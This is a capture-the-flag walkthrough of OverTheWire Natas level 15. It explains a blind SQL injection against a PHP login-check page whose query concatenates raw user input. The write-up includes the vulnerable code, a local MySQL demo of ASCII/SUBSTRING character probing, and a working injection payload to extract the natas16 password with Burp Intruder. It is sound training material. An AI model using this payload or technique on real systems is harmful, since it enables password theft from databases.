# Level 15
Pushing things further, here we do Blind SQL injection. Also, we'll make a python script to do the same.

##  Quest
We are presented with a simple page that checks if a user exists or not.
![Level 15 Image](./images/Level15.png)

Backend code is similar to previous level with some important changes
```php
<?
/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas15', '<censored>');
    mysql_select_db('natas15', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?>
```
<br/><br/>
## Solution
From the source code, we can see that<br/>
 - Again unsanitized user input is inserted into query.<br/>
 - Although no output is displayed after query execution, we can make use of blind SQL injection.<br/>
 - When query succeeds, we get _user exists_, and when it fails, we get _user doesn't exist_ msg. we'll leverage this behaviour<br/>
 - Additionally, we can see that there is a debug parameter, which displays query on screen.<br/>
 - Lastly, there is a users table with username and password column.<br/>

Here is what was done.
1. Firstly, check if user `natas16` exist, it does, and we want its password.
2. Below is a log from my local linux lab to make use of `ascii` and `substring` function to smuggle password.
```sql
# Testing query in Lab
# Our Sample table
mysql> select * from books;
+---------+--------------+-----------+----------+
| book_id | name         | author    | released |
+---------+--------------+-----------+----------+
|       1 | Big Magic    | Elizabeth |        1 |
|       2 | Brown Farm   | AK        |        0 |
|       3 | Malgudi Days | R.K.N     |        1 |
+---------+--------------+-----------+----------+
3 rows in set (0.00 sec)

# We compare first character of author name with ascii code  # Below is a successful attempt
mysql> select * from books where name = 'Big Magic' and ASCII(SUBSTRING(author, 1, 1)) = 69;
+---------+-----------+-----------+----------+
| book_id | name      | author    | released |
+---------+-----------+-----------+----------+
|       1 | Big Magic | Elizabeth |        1 |
+---------+-----------+-----------+----------+
1 row in set (0.00 sec)

# Below is an unsuccessful attempt
mysql> select * from books where name = 'Big Magic' and ASCII(SUBSTRING(author, 1, 1)) = 70;
Empty set (0.00 sec)
```
Lets focus on second query
```sql
select * from books where name = 'Big Magic' and ASCII(SUBSTRING(author, 1, 1)) = 69;
```
`SUBSTRING(author, 1, 1)` refers to the first character and `ASCII` converts that first character to its ASCII code.
So, Above query will return a row if the ASCII code of first character of the name of author is equal to 69, i.e. E

Now we build our payload accordingly.<br/>
Our payload -> `GET /index.php?username=natas16" AND ASCII(SUBSTRING(password,1,1))=65;#&debug=true HTTP/1.1`
Just like above, we are checking if the first character of password of user natas16 has ascii code of 65 .i.e. its A
Below we send this to Burp, our failed attempt

![Level 15 solution](./images/Level15_solution.png)

Our successfull attempt, Now we know, our password begins with word 'W', ascii code 87.

![Level 15.1 solution](./images/Level15.1_solution.png)

Now instead of doing every character one by one, we use Burp intruder. we manually change the `password(1,1)` -> `password(2,1)` for finding second character and so on. This process will repeat till we find all characters. Here password is 32 characters long. On 33rd attempt, intruder will not find any character and we know that we are done.

![Level 15.2 solution](./images/Level15.2_solution.png)

Payload settings
![Level 15.3 solution](./images/Level15.3_solution.png)

We found the second password character.
![Level 14.4 solution](./images/Level15.4_solution.png)

